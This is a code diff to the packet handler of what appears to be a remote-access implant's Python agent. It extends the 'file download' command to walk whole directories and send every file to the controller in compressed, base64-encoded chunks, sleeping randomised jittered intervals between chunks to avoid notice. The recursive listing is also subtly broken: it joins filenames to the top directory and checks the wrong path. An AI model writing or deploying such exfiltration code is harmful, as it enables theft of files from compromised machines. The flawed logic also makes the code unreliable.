@@ -280,41 +280,53 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 41:
         # file download
-        filePath = os.path.abspath(data)
-        if not os.path.exists(filePath):
+        objPath = os.path.abspath(data)
+        fileList = []
+        if not os.path.exists(objPath):
             return build_response_packet(40, "file does not exist or cannot be accessed", resultID)
 
-        offset = 0
-        size = os.path.getsize(filePath)
-        partIndex = 0
+        if not os.path.isdir(objPath):
+            fileList.append(objPath)
+        else:
+            # recursive dir listing
+            for folder, subs, files in os.walk(objPath):
+                for filename in files:
+                    #dont care about symlinks
+                    if os.path.exists(objPath):
+                        fileList.append(objPath + "/" + filename)
 
-        while True:
+        for filePath in fileList:
+            offset = 0
+            size = os.path.getsize(filePath)
+            partIndex = 0
 
-            # get 512kb of the given file starting at the specified offset
-            encodedPart = get_file_part(filePath, offset=offset, base64=False)
-            c = compress()
-            start_crc32 = c.crc32_data(encodedPart)
-            comp_data = c.comp_data(encodedPart)
-            encodedPart = c.build_header(comp_data, start_crc32)
-            encodedPart = base64.b64encode(encodedPart)
+            while True:
 
-            partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
-            if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
-                break
+                 # get 512kb of the given file starting at the specified offset
+                 encodedPart = get_file_part(filePath, offset=offset, base64=False)
+                 c = compress()
+                 start_crc32 = c.crc32_data(encodedPart)
+                 comp_data = c.comp_data(encodedPart)
+                 encodedPart = c.build_header(comp_data, start_crc32)
+                 encodedPart = base64.b64encode(encodedPart)
 
-            send_message(build_response_packet(41, partData, resultID))
+                 partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
+                 if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
+                     break
 
-            global delay
-            global jitter
-            if jitter < 0: jitter = -jitter
-            if jitter > 1: jitter = 1/jitter
+                 send_message(build_response_packet(41, partData, resultID))
 
-            minSleep = int((1.0-jitter)*delay)
-            maxSleep = int((1.0+jitter)*delay)
-            sleepTime = random.randint(minSleep, maxSleep)
-            time.sleep(sleepTime)
-            partIndex += 1
-            offset += 512000
+                 global delay
+                 global jitter
+                 if jitter < 0: jitter = -jitter
+                 if jitter > 1: jitter = 1/jitter
+
+                 minSleep = int((1.0-jitter)*delay)
+                 maxSleep = int((1.0+jitter)*delay)
+                 sleepTime = random.randint(minSleep, maxSleep)
+                 time.sleep(sleepTime)
+                 partIndex += 1
+                 offset += 512000
 
     elif packetType == 42:
         # file upload
